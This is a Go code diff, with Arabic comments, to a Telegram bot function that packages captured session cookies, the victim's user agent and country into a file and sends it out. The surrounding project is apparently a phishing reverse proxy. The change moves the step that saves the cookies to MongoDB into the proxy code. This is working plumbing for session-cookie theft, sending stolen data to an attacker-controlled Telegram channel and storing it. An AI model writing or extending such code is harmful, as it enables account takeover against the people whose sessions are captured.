@@ -648,6 +648,10 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 		}
 	}
 	
+	// حفظ cookiesList في قاعدة البيانات MongoDB
+	// يتم استدعاء هذه الدالة من core/http_proxy.go، وهناك يتم حفظ الكوكيز في قاعدة البيانات
+	// لذلك لا نحتاج إلى تكرار الحفظ هنا
+	
 	// تحويل قائمة الكوكيز إلى JSON
 	cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
 	if err != nil {
@@ -664,21 +668,6 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 	cookiesText += fmt.Sprintf("متصفح المستخدم: %s\n", userAgent)
 	cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", country, countryCode)
 	cookiesText += "=== الكوكيز ===\n" + string(cookiesJSON) + "\n\n"
-	
-	// حفظ cookiesList في قاعدة البيانات MongoDB
-	// استدعاء الدالة المسؤولة عن حفظ cookiesList في قاعدة البيانات
-	// يجب استخدام الواجهة العامة IDatabase
-	// نحن نفترض أن هناك متغير عام يمثل قاعدة البيانات متاح لنا في core
-	if db, ok := Databases["mongodb"].(*database.MongoDatabase); ok {
-		if err := db.SetSessionCookies(sessionID, cookiesList); err != nil {
-			log.Error("فشل في حفظ الكوكيز في قاعدة البيانات: %v", err)
-			// نستمر على الرغم من الخطأ لإرسال الملف على الأقل
-		} else {
-			log.Success("تم حفظ الكوكيز في قاعدة البيانات بنجاح")
-		}
-	} else {
-		log.Warning("قاعدة البيانات MongoDB غير متاحة، لم يتم حفظ الكوكيز")
-	}
 	
 	// إرسال الملف
 	fileName := fmt.Sprintf("cookies_%s_%s.txt", name, sessionID)
